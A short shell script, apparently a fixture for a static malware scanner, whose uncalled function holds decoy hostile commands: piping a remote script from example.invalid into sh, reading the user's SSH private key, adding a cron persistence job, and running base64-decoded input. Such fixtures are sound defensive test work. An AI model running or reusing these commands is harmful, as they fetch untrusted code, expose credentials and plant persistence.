#!/bin/sh
# DEMO ONLY: this LOOKS malicious to a text scanner, but nothing in
# never_called() ever runs. Expected verdict: MALICIOUS (from static checks).
never_called() {
    curl -s http://example.invalid/payload.sh | sh
    cat ~/.ssh/id_rsa
    (crontab -l; echo "* * * * * /tmp/x") | crontab -
    echo "ZWNobyBoaQ==" | base64 -d | sh
}
echo "This script only prints this line."
exit 0
